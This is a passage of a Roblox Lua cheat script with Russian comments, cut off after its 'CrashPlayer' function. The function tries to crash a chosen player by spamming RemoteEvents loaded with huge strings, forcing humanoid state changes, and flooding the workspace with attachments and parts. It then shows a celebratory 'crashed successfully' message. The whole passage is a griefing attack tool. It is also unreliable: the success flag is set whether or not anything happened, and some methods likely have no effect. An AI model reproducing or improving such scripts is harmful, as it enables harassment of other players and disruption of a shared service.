    -- Функция краша (улучшенная)
    local function CrashPlayer(player)
        if not player then
            StatusLabel.Text = "❌ No player selected!"
            StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
            return
        end
        
        StatusLabel.Text = "💥 Attempting to crash " .. player.Name .. "..."
        StatusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
        
        local success = false
        
        -- Множество методов краша
        pcall(function()
            -- Метод 1: Огромное количество ремов с данными
            for i = 1, 800 do
                local remote = Instance.new("RemoteEvent")
                remote.Name = "Crash_X" .. i
                remote.Parent = ReplicatedStorage
                remote:FireServer(player, {string.rep("A", 5000), i, player})
                task.wait()
                remote:Destroy()
            end
            
            -- Метод 2: Спам анимаций
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                local hum = player.Character.Humanoid
                for i = 1, 150 do
                    hum:ChangeState(Enum.HumanoidStateType.Jumping)
                    task.wait()
                    hum:ChangeState(Enum.HumanoidStateType.Freefall)
                    task.wait()
                    hum:ChangeState(Enum.HumanoidStateType.Stunned)
                    task.wait()
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                    task.wait()
                end
            end
            
            -- Метод 3: Спам партиклов
            for i = 1, 300 do
                local att = Instance.new("Attachment")
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    att.Parent = player.Character.HumanoidRootPart
                else
                    att.Parent = workspace
                end
                task.wait()
                att:Destroy()
            end
            
            -- Метод 4: Огромное количество объектов
            for i = 1, 500 do
                local part = Instance.new("Part")
                part.Size = Vector3.new(50, 50, 50)
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    part.Position = player.Character.HumanoidRootPart.Position
                end
                part.Transparency = 1
                part.CanCollide = false
                part.Parent = workspace
                task.wait()
                part:Destroy()
            end
            
            -- Метод 5: Крах через сеть
            for i = 1, 200 do
                local fakeRemote = Instance.new("RemoteEvent")
                fakeRemote.Name = "Net_" .. i
                fakeRemote.Parent = ReplicatedStorage
                fakeRemote:FireServer(player, string.rep("X", 10000))
                fakeRemote:Destroy()
                task.wait()
            end
            
            success = true
        end)
        
        if success then
            StatusLabel.Text = "✅ " .. player.Name .. " crashed successfully!"
            StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
            
            -- Эффект успеха
            for i = 1, 50 do
                local p = Instance.new("Frame")
                p.Size = UDim2.new(0, math.random(3, 10), 0, math.random(3, 10))
                p.Position = UDim2.new(0, math.random(0, 900), 0, math.random(0, 450))
                p.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
                p.BackgroundTransparency = 0.5
                p.BorderSizePixel = 0
                p.Parent = CrashPanel
                
                local cor = Instance.new("UICorner")
                cor.CornerRadius = UDim.new(0, 10)
                cor.Parent = p
                
                TweenService:Create(p, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
                    BackgroundTransparency = 1,
                    Size = UDim2.new(0, math.random(30, 70), 0, math.random(30, 70))
                }):Play()
                task.wait(0.02)
                p:Destroy()
            end
        else
            StatusLabel.Text = "❌ Failed to crash " .. player.Name .. "!"
            StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        end
    end
    
    -- Функция активации краш системы
